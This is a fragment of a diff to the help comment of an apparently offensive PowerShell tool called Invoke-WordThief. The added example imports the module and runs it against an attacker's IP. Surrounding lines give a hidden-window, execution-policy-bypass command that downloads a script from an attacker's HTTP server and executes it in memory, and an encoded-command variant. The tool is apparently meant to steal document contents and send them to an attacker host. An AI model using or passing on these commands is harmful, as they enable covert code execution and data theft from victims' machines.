@@ -28,6 +28,10 @@ powershell -nop -w 1 -exec bypass -c "IEX (New-Object Net.WebClient).DownloadStr
 Downloads the script from attacker's HTTP file server (you can use python's "http.server" module for that)
 
 .EXAMPLE
+Import-Module .\Invoke-WordThief.ps1
+Invoke-WordThief -Server [attacker's ip]
+
+.EXAMPLE
 powershell -exec bypass -w 1 -nop -enc [Base64 string, look at "powershell.exe /?" to learn how to make one]
 
 #>
